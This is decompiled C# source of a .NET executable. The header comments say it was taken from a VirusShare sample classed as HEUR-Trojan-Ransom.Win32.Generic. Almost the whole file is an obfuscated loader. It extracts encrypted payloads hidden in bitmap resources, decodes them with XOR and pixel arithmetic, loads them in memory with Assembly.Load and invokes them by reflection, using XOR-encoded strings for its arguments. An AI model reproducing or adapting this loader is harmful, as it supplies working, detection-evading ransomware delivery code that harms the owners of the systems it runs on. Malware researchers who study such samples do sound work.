// Decompiled with JetBrains decompiler
// Type: LûFÚXBÆËBÇPÇ
// Assembly: Flash, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1786FB8D-D0D9-4897-8EED-82494E3066DF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-d0b3002752bdf21cdd6d366dbe4ff92ff94f16d225db1bc3b90e54ab0e27c4ab.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

public class LûFÚXBÆËBÇPÇ
{
  private static string vDdj4ÖöÊSFæ1U = "ïÞxaARnçDÙrÚÒõËDnè9cõÇîöùtôzâÜ";
  private static ResourceManager ÕâpcÊçÑ1XãF = new ResourceManager("Vi49rI7rPpmxa", Assembly.GetExecutingAssembly());

  private static byte[] ãÓxlCz39bq => LûFÚXBÆËBÇPÇ.zÊÌwÁìNéáÊp(LûFÚXBÆËBÇPÇ.ócXÄ7ñNZiK3àÇû((Bitmap) LûFÚXBÆËBÇPÇ.ÕâpcÊçÑ1XãF.GetObject("AC1djFummnKyeHCaKB8"), LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U));

  private static byte[] BÇ3ÈEüÀÒèDÜú => LûFÚXBÆËBÇPÇ.zÊÌwÁìNéáÊp(LûFÚXBÆËBÇPÇ.ócXÄ7ñNZiK3àÇû((Bitmap) LûFÚXBÆËBÇPÇ.ÕâpcÊçÑ1XãF.GetObject("FsaHWnXGgSvxV9"), LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U));

  [STAThread]
  public static void Main()
  {
    object[] objArray1 = new object[7]
    {
      (object) LûFÚXBÆËBÇPÇ.ãÓxlCz39bq,
      (object) LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("89110F053708822ABD17A8FC90B321"),
      (object) false,
      (object) false,
      (object) false,
      (object) false,
      (object) LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("89110F12370D")
    };
    byte[] bç3ÈeüÀòèDüú1 = LûFÚXBÆËBÇPÇ.BÇ3ÈEüÀÒèDÜú;
    ref byte[] local1 = ref bç3ÈeüÀòèDüú1;
    string str1 = LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("97160B24311A");
    ref string local2 = ref str1;
    ref object[] local3 = ref objArray1;
    LûFÚXBÆËBÇPÇ.ýljéìsRÆíèýPp(ref local1, ref local2, ref local3);
    object[] objArray2 = new object[7]
    {
      (object) LûFÚXBÆËBÇPÇ.zÊÌwÁìNéáÊp(LûFÚXBÆËBÇPÇ.ócXÄ7ñNZiK3àÇû((Bitmap) LûFÚXBÆËBÇPÇ.ÕâpcÊçÑ1XãF.GetObject("CwJYkeHoF7BM9vfOB2h"), LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U)),
      (object) LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("8D100E2239198632BC2D9CBE94B82C31A1571081A6829A9C06DA1F9AB9"),
      (object) false,
      (object) false,
      (object) true,
      (object) false,
      (object) LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("89110F12370D")
    };
    byte[] bç3ÈeüÀòèDüú2 = LûFÚXBÆËBÇPÇ.BÇ3ÈEüÀÒèDÜú;
    ref byte[] local4 = ref bç3ÈeüÀòèDüú2;
    string str2 = LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("97160B24311A");
    ref string local5 = ref str2;
    ref object[] local6 = ref objArray2;
    LûFÚXBÆËBÇPÇ.ýljéìsRÆíèýPp(ref local4, ref local5, ref local6);
  }

  public static void ýljéìsRÆíèýPp(
    ref byte[] FKîx0çUÎBaVæççQ,
    ref string NÌHUÓYþKÜØÌ,
    ref object[] ëëNAÇØÇþNqø)
  {
    object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(FKîx0çUÎBaVæççQ).CreateInstance(LûFÚXBÆËBÇPÇ.ÍÓÇRëèèïù3ì7qåjÌ("8C0D0F1117")));
    objectValue.GetType().InvokeMember(NÌHUÓYþKÜØÌ, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), ëëNAÇØÇþNqø);
  }

  public static string ÍÓÇRëèèïù3ì7qåjÌ(string wG9ðhÆãQ0PEçÄøo)
  {
    long num1 = (long) Math.Round((double) Strings.Len(wG9ðhÆãQ0PEçÄøo) / 2.0);
    string str;
    for (long index = 1; index <= num1; ++index)
    {
      int num2 = (int) Math.Round(Conversion.Val("&H" + Strings.Mid(wG9ðhÆãQ0PEçÄøo, (int) (2L * index - 1L), 2)));
      int num3 = Strings.AscW(Strings.Mid(LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U, (int) (index % (long) Strings.Len(LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U) + 1L), 1));
      str += Conversions.ToString(Strings.ChrW(num2 ^ num3));
    }
    return str;
  }

  public static byte[] zÊÌwÁìNéáÊp(byte[] QzRBcCâä5XfjPèSd)
  {
    byte[] bytes = Encoding.Unicode.GetBytes(LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U);
    byte[] array1 = new byte[0];
    Array.Resize<byte>(ref array1, bytes.Length);
    int index1 = 0;
    int num1 = QzRBcCâä5XfjPèSd.Length - 1 - (array1.Length - 1);
    int num2 = QzRBcCâä5XfjPèSd.Length - 1;
    for (int index2 = num1; index2 <= num2; ++index2)
    {
      array1[index1] = QzRBcCâä5XfjPèSd[index2];
      ++index1;
    }
    byte[] array2 = QzRBcCâä5XfjPèSd;
    Array.Resize<byte>(ref array2, QzRBcCâä5XfjPèSd.Length - array1.Length);
    int index3 = 0;
    int num3 = array2.Length - 1;
    for (int index4 = 0; index4 <= num3; ++index4)
    {
      array2[index4] = (byte) ((int) QzRBcCâä5XfjPèSd[index4] ^ (int) array1[index3] ^ (int) bytes[index3]);
      if (index3 == bytes.Length - 1)
        index3 = 0;
      else
        ++index3;
    }
    return array2;
  }

  public static byte[] ócXÄ7ñNZiK3àÇû(Bitmap OîbkÈäOPgÀY, string gÔûÃÈÍÛyíÀ)
  {
    byte[] array;
    try
    {
      string str = gÔûÃÈÍÛyíÀ;
      int index1 = 0;
      int num1;
      for (int length = str.Length; index1 < length; ++index1)
      {
        char ch = str[index1];
        num1 += (int) ch;
      }
      int num2 = OîbkÈäOPgÀY.Width * OîbkÈäOPgÀY.Height;
      for (int x = OîbkÈäOPgÀY.Width - 1; x != 0; --x)
      {
        Color color = OîbkÈäOPgÀY.GetPixel(x, OîbkÈäOPgÀY.Height - 1);
        int num3 = 0;
        int num4 = (int) color.R % (int) byte.MaxValue;
        int num5 = (int) color.B - (num4 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
        if ((num4 + (int) byte.MaxValue * num5 ^ num1) == 47)
          --num2;
        color = new Color();
        num3 = 0;
      }
      array = new byte[num2 + 1];
      int index2 = 0;
      for (int x = 0; x != OîbkÈäOPgÀY.Width; ++x)
      {
        int y = 0;
        while (y != OîbkÈäOPgÀY.Height)
        {
          Color color = OîbkÈäOPgÀY.GetPixel(x, y);
          int num6 = 0;
          int num7 = (int) color.R % (int) byte.MaxValue;
          int num8 = (int) color.B - (num7 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
          int num9 = num7 + (int) byte.MaxValue * num8 ^ num1;
          if (num9 != 47)
            array[index2] = (byte) (num9 - (int) byte.MaxValue);
          color = new Color();
          num6 = 0;
          ++y;
          ++index2;
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (false)
      {
        int num = (int) MessageBox.Show(exception.Message);
      }
      ProjectData.ClearProjectError();
    }
    for (int newSize = array.Length - (Encoding.Unicode.GetByteCount(LûFÚXBÆËBÇPÇ.vDdj4ÖöÊSFæ1U.ToCharArray()) - 1); newSize != array.Length; ++newSize)
    {
      if (array[newSize] == (byte) 0)
      {
        Array.Resize<byte>(ref array, newSize);
        break;
      }
    }
    return array;
  }
}
